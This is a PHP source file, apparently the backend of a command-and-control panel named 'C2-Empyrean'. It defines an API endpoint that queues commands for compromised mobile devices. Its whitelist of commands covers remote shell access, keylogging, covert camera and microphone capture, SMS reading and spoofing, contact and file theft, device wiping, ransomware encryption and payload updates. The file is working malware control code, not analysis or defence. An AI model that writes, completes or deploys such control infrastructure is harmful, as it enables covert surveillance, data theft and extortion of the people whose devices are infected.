<?php
/**
 * C2-Empyrean - API: Send Device Command
 * POST /api/device/command
 * Body: { "device_id": "...", "command": "...", "params": {} }
 */

$middleware->requireAuth();

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input || empty($input['device_id']) || empty($input['command'])) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Device ID and command required']);
    exit;
}

$deviceId = $input['device_id'];
$command = $input['command'];
$params = $input['params'] ?? [];
$priority = $input['priority'] ?? 'normal';

// Validate device exists
$devices = $db->read('devices');
$deviceExists = false;
foreach ($devices as $d) {
    if (($d['device_id'] ?? '') === $deviceId) {
        $deviceExists = true;
        break;
    }
}

if (!$deviceExists) {
    http_response_code(404);
    echo json_encode(['success' => false, 'error' => 'Device not found']);
    exit;
}

// Valid commands list
$validCommands = [
    'shell', 'screenshot', 'screenrecord', 'keylogger_start', 'keylogger_stop',
    'cam_photo', 'cam_video_start', 'cam_video_stop', 'mic_start', 'mic_stop',
    'location', 'sms_list', 'sms_send', 'sms_spoof', 'call_logs', 'call_make',
    'contacts', 'notifications', 'clipboard', 'file_list', 'file_download',
    'file_upload', 'file_delete', 'app_list', 'app_install', 'app_uninstall',
    'lock_device', 'wipe_device', 'lockdown_start', 'lockdown_stop',
    'ransomware_encrypt', 'ransomware_decrypt', 'toast', 'open_url',
    'vibrate', 'update_payload', 'self_destruct', 'ping',
];

if (!in_array($command, $validCommands)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid command: ' . $command]);
    exit;
}

// Store command in queue
$commands = $db->read('commands');
$commandId = bin2hex(random_bytes(12));
$commands[] = [
    '_id' => $commandId,
    'device_id' => $deviceId,
    'command' => $command,
    'params' => $params,
    'priority' => $priority,
    'status' => 'pending',
    'result' => null,
    'created_at' => time(),
    'executed_at' => null,
    'created_by' => $auth->getCurrentUser(),
];
$db->write('commands', $commands);

echo json_encode([
    'success' => true,
    'data' => [
        'command_id' => $commandId,
        'device_id' => $deviceId,
        'command' => $command,
        'status' => 'pending',
        'message' => 'Command queued successfully',
    ],
]);
